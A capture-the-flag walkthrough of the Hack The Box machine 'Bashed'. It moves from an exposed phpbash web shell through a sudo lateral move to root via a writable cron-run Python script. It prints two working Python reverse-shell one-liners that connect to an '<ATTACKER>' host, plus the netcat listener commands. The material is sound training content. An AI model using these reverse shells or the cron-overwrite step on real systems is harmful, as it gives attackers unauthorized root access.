# HTB — Bashed

**Difficulty:** Easy
**OS:** Linux (Ubuntu)
**Target Service:** Apache httpd 2.4.18 / phpbash web shell
**Key Concepts:** Web shell discovery, sudo lateral movement, cron job abuse

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Only one port open:

| Port | Service |
|------|---------|
| 80 | Apache httpd 2.4.18 (Ubuntu) |

Pulled HTTP headers and page content:

```bash
curl -I http://10.xx.xx.xx && curl -L http://10.xx.xx.xx
```

The page identified itself as "Arrexel's Development Site" with a blog post describing **phpbash** — a web-based shell the developer built and tested on this exact server. The source linked to the phpbash GitHub repo.

Key quote from the page: *"I actually developed it on this exact server!"*

This is a direct hint that phpbash.php may still be sitting on the web server.

---

## Phase Enumeration

Ran directory enumeration to find where phpbash was deployed:

```bash
gobuster dir -u http://10.xx.xx.xx -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Key findings:

| Path | Status | Notes |
|------|--------|-------|
| `/dev/` | 301 | Developer directory |
| `/uploads/` | 301 | Writable upload directory |
| `/config.php` | 200 | Empty — no disclosure |

Navigated to `/dev/` in browser — directory listing was enabled, revealing:

```
phpbash.php      8.1K
phpbash.min.php  4.6K
```

---

## Phase Exploit — Web Shell Access

Navigated directly to:

```
http://10.xx.xx.xx/dev/phpbash.php
```

An interactive browser-based terminal loaded immediately, running as `www-data`. No authentication required — the file was left exposed on a publicly accessible path.

Situational awareness commands confirmed:

```bash
whoami   # www-data
hostname # bashed
uname -a # Linux bashed 4.4.0-62-generic
```

Retrieved the user flag from `/home/arrexel/user.txt`. Flag redacted.

---

## Phase Privilege Escalation — www-data → scriptmanager

First privesc check:

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` can run any command as `scriptmanager` without a password. The web shell was too limited for an interactive session, so a Python reverse shell was used to get a proper terminal:

Set up listener on Kali:

```bash
nc -lvnp 4444
```

Executed from phpbash:

```bash
sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

Caught a shell as `scriptmanager`. Upgraded to full TTY:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Phase Privilege Escalation — scriptmanager → root

Enumerated filesystem for directories owned by scriptmanager:

```bash
ls -la /
```

Found:

```
drwxrwxr--  2 scriptmanager scriptmanager  4096 /scripts
```

Investigated the directory:

```bash
ls -la /scripts
```

Output:

```
-rw-r--r--  1 scriptmanager scriptmanager  58  test.py
-rw-r--r--  1 root          root           12  test.txt
```

Critical observation — `test.py` is owned by `scriptmanager` (writable), but `test.txt` is owned by `root`. This means root is executing `test.py` automatically via a cron job and writing the output.

Confirmed by reading the script:

```bash
cat /scripts/test.py
# f = open("test.txt", "w")
# f.write("testing 123!")
# f.close
```

The script writes to `test.txt` — and root owns that file. Root is running this script.

Set up a second listener on Kali:

```bash
nc -lvnp 5555
```

Overwrote `test.py` with a Python reverse shell payload:

```bash
echo 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER>",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /scripts/test.py
```

Within one minute the cron job fired and the listener caught a connection:

```
root@bashed:/scripts#
```

Retrieved root flag from `/root/root.txt`. Flag redacted.

---

## Privilege Escalation Chain Summary

```
www-data → scriptmanager (sudo NOPASSWD: ALL as scriptmanager)
         → root          (cron job executing writable Python script as root)
```

---

## Key Takeaways

- Always read page source and blog content manually — the developer explicitly described phpbash being on the server, which directed the entire attack path
- Directory listing enabled on `/dev/` exposed phpbash directly — no brute force needed once the directory was found
- The sudo privesc here is lateral, not vertical — `www-data` moved sideways to `scriptmanager` rather than straight to root. This is common in real environments and easy to overlook
- When a script is writable by your user but its output file is owned by root, a cron job is almost certainly involved — check the ownership mismatch, not just the script itself
- Two listeners on different ports are needed when chaining shells — keep track of which connection is which
- The cron exploitation technique here (overwrite script, wait for scheduled execution) is a core privesc pattern that appears frequently in both CTFs and real assessments
